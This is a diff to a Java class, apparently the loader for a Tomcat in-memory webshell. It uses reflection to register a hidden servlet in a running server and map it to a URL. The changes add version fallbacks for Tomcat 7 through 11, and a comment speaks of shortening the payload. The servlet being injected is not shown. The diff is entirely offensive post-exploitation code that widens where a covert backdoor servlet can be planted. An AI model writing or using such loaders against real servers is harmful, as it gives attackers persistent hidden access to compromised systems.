@@ -87,14 +87,23 @@ public class TomcatServletThreadLoader {
         Object standardWrapper = Class.forName("org.apache.catalina.core.StandardWrapper").newInstance();
         invokeMethod(standardWrapper.getClass().getSuperclass(), standardWrapper, "setName", new Class[]{String.class}, new Object[]{NAME});
         invokeMethod(standardWrapper.getClass(), standardWrapper, "setServletClass", new Class[]{String.class}, new Object[]{CLASSNAME});
-        invokeMethod(standardWrapper.getClass(), standardWrapper, "setServlet", new Class[]{servletClass}, new Object[]{object});
+        try {
+            invokeMethod(standardWrapper.getClass(), standardWrapper, "setServlet", new Class[]{servletClass}, new Object[]{object});
+        } catch (Exception e) {
+            setFieldValue(standardWrapper, "instance", object);
+        }
 
         // addChild
-        invokeMethod(standardContext.getClass().getSuperclass(), standardContext, "addChildInternal", new Class[]{Class.forName("org.apache.catalina.Container")}, new Object[]{standardWrapper});
-//        invokeMethod(standardContext.getClass(), standardContext, "addChild", new Class[]{Class.forName("org.apache.catalina.Container")}, new Object[]{standardWrapper});
+        invokeMethod(Class.forName("org.apache.catalina.core.ContainerBase"), standardContext, "addChildInternal", new Class[]{Class.forName("org.apache.catalina.Container")}, new Object[]{standardWrapper});
 
 //        // 取一种 缩短 payload
-        invokeMethod(standardContext.getClass(), standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATH, NAME});
+        try {
+            // 7
+            invokeMethod(Class.forName("org.apache.catalina.core.StandardContext"), standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATH, NAME});
+        } catch (Exception e) {
+            // 8-11
+            invokeMethod(Class.forName("org.apache.catalina.core.StandardContext"), standardContext, "addServletMappingDecoded", new Class[]{String.class, String.class, boolean.class}, new Object[]{PATH, NAME, false});
+        }
 //        try {
 //            // M1 Servlet映射到URL模式
 //            invokeMethod(standardContext.getClass(), standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATH, NAME});
